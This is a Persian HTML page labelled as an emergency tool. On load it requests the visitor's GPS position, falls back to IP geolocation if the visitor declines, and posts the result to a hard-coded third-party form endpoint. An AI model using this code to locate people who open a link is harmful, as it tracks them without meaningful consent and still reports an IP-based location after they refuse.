<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>موقعیت اضطراری</title>
    <style>
        body { font-family: Tahoma; direction: rtl; text-align: center; padding: 20px; background: #111; color: #eee; }
        #status { margin-top: 30px; font-size: 18px; }
    </style>
</head>
<body>
    <h2>در حال دریافت موقعیت...</h2>
    <div id="status"></div>

    <script>
        // ====== تنظیمات ======
        const FORM_ENDPOINT = 'https://formspree.io/f/mpqevqkd'; // ← endpoint خودت
        // ====================

        const statusEl = document.getElementById('status');

        function updateStatus(text, isError = false) {
            statusEl.textContent = text;
            if (isError) statusEl.style.color = '#f66';
            else statusEl.style.color = '#6f6';
        }

        // ارسال مختصات به سرور
        async function sendLocation(lat, lng, accuracy, method) {
            const payload = {
                lat: lat,
                lng: lng,
                accuracy: accuracy || 'نامشخص',
                method: method,
                time: new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' })
            };

            try {
                const response = await fetch(FORM_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (response.ok) {
                    updateStatus(`✅ موقعیت با روش ${method} ارسال شد.`);
                } else {
                    updateStatus(`❌ خطای سرور ثبت (${response.status})`, true);
                }
            } catch (err) {
                updateStatus('❌ خطا در اتصال به سرویس ثبت.', true);
            }
        }

        // ========== موقعیت‌یابی IP (تک سرویس مطمئن + یک fallback) ==========
        async function getIPLocation() {
            const tryFetch = async (url, parser, name) => {
                try {
                    const ctrl = new AbortController();
                    setTimeout(() => ctrl.abort(), 4000);
                    const resp = await fetch(url, { signal: ctrl.signal });
                    if (!resp.ok) throw new Error('status ' + resp.status);
                    const data = await resp.json();
                    const loc = parser(data);
                    if (loc && loc.lat && loc.lng) {
                        console.log('IP service success:', name);
                        return { ...loc, service: name };
                    }
                } catch (e) {
                    console.warn(name + ' ناموفق', e.message);
                }
                return null;
            };

            // ۱. ip.sb – CORS دارد و معمولاً در ایران باز است
            const r1 = await tryFetch(
                'https://api.ip.sb/geoip',
                (d) => ({
                    lat: parseFloat(d.latitude),
                    lng: parseFloat(d.longitude),
                    accuracy: 'دقت شهری (ip.sb)',
                    method: 'ip'
                }),
                'ip.sb'
            );
            if (r1) return r1;

            // ۲. fallback: ipapi.co (ممکن است فیلتر باشد، ولی شانس دیگری است)
            const r2 = await tryFetch(
                'https://ipapi.co/json/',
                (d) => ({
                    lat: d.latitude,
                    lng: d.longitude,
                    accuracy: 'دقت شهری (ipapi)',
                    method: 'ip'
                }),
                'ipapi'
            );
            if (r2) return r2;

            throw new Error('هیچ سرویس موقعیت‌یابی IP در دسترس نیست');
        }

        // ====== GPS اصلی (بدون تغییر) ======
        function tryGPS() {
            updateStatus('📡 در حال جستجوی ماهواره...');

            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    sendLocation(
                        pos.coords.latitude,
                        pos.coords.longitude,
                        `دقت ${Math.round(pos.coords.accuracy)} متر`,
                        'gps'
                    );
                },
                (err) => {
                    console.warn('GPS ناموفق', err.message);
                    updateStatus('📍 استفاده از IP...');
                    getIPLocation()
                        .then(loc => sendLocation(loc.lat, loc.lng, loc.accuracy, 'ip'))
                        .catch(() => updateStatus('❌ دریافت موقعیت کاملاً ناموفق بود.', true));
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        tryGPS();
    </script>
</body>
</html>
